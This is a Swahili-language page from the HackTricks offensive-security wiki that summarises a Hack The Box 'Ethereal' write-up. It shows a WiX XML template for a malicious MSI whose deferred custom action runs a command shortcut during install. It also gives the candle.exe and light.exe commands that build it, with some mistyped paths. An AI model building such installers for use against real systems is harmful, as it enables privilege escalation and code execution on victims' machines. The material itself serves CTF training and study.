# Kuunda MSI Hasidi na Kupata Root

{{#include ../../banners/hacktricks-training.md}}

Uundaji wa MSI installer utafanywa kwa kutumia wixtools, hasa [wixtools](http://wixtoolset.org) itatumika. Inafaa kutaja kwamba MSI builders mbadala zilijaribiwa, lakini hazikufaulu katika hali hii mahususi.<sup>[[1]](#references)</sup>

Kwa uelewa wa kina wa mifano ya matumizi ya wix MSI, inashauriwa kushauriana na [ukurasa huu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.<sup>[[2]](#references)</sup>

Lengo ni kutengeneza MSI ambayo itatekeleza faili ya lnk. Ili kufanikisha hili, code ya XML ifuatayo inaweza kutumika ([xml kutoka hapa](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Ni muhimu kutambua kwamba Package element ina attributes kama vile InstallerVersion na Compressed, zinazobainisha toleo la installer na kuonyesha iwapo package imebanwa au la, mtawalia.

Mchakato wa uundaji unahusisha kutumia candle.exe, tool kutoka wixtools, ili kutengeneza wixobject kutoka kwa msi.xml. Command ifuatayo inapaswa kutekelezwa:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Zaidi ya hayo, inafaa kutaja kwamba picha imewekwa kwenye chapisho, inayoonyesha command na output yake. Unaweza kuitumia kama mwongozo wa kuona.<sup>[[1]](#references)</sup>

Vilevile, light.exe, tool nyingine kutoka wixtools, itatumika kuunda faili la MSI kutoka kwa wixobject. Command itakayotekelezwa ni ifuatayo:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Sawa na command ya awali, image imejumuishwa kwenye post inayoonyesha command na matokeo yake.<sup>[[1]](#references)</sup>

Tafadhali kumbuka kwamba ingawa muhtasari huu unalenga kutoa maelezo muhimu, inapendekezwa kurejelea post ya awali kwa maelezo ya kina zaidi na instructions sahihi.<sup>[[1]](#references)</sup>

## Marejeo

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (tazama pia [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
